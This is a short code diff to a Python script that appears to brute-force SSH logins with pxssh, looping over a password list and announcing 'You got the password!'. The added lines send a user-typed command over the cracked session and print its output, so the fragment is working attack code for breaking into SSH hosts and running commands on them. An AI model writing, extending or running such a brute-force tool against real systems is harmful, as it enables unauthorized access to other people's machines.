@@ -33,6 +33,10 @@ def pwd_list():
                 s.login(host, username, pwd)
                 print("You got the password!")
                 break_in = "yes"
+                #Demonstrate connection via SSH
+                s.sendline(input("Please enter a command to confirm connection: "))
+                s.prompt()
+                print(s.before)
                 break
             except pxssh.ExceptionPxssh as e:
                 print("pxssh failed on login.")
